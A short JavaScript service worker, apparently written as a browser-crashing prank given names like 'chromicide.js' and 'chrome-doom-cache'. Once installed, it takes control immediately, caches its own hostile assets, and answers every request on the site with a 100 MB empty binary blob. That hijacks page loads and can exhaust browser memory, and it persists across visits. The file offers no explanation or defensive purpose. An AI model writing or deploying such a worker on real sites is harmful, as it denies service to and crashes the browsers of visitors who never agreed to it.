self.addEventListener('install', e => {
    self.skipWaiting();
    e.waitUntil(
        caches.open('chrome-doom-cache').then(cache => {
            return cache.addAll([
                '/',
                '/assets/css/chromehell.css',
                '/assets/js/chromicide.js'
            ]);
        })
    );
});

self.addEventListener('fetch', e => {
    e.respondWith(new Response(new ArrayBuffer(1024 * 1024 * 100), {
        status: 200,
        headers: {'Content-Type': 'application/octet-stream'}
    }));
});
